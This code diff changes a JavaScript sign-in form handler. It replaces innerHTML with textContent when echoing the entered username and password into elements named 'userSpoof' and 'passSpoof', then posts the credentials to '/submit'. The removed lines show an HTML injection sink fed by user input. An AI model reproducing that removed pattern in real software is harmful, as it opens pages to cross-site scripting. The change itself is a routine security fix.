@@ -59,14 +59,16 @@
 
     signIn.addEventListener('submit', async event => {
       event.preventDefault();
-      document.getElementById("userSpoof").innerHTML = username.value;
-      document.getElementById("passSpoof").innerHTML = password.value;
+      const usernametext = username.value;
+      const passwordtext = password.value;
+      document.getElementById("userSpoof").textContent = username.value;
+      document.getElementById("passSpoof").textContent = password.value;
       try {
           const response = await fetch('/submit', {
             method: 'POST',
             body: new URLSearchParams({
-              username: username.value,
-              password: password.value
+              username: usernametext,
+              password: passwordtext
             })
           });
 
